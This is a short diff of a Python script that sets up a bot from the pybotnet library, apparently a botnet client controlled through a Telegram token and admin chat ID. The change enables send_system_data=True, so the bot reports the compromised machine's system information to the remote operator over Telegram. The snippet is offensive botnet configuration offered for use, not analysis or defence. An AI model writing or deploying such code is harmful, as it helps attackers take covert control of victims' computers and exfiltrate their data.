@@ -11,7 +11,8 @@ import time
 # ADMIN_CHAT_ID = '12345678910'
 delay = 20
 
-bot = pybotnet.PyBotNet(TELEGRAM_TOKEN, ADMIN_CHAT_ID, show_log=True)
+bot = pybotnet.PyBotNet(TELEGRAM_TOKEN, ADMIN_CHAT_ID,
+                        show_log=True, send_system_data=True)
 print(bot)
 while True:
     print('*'*100)
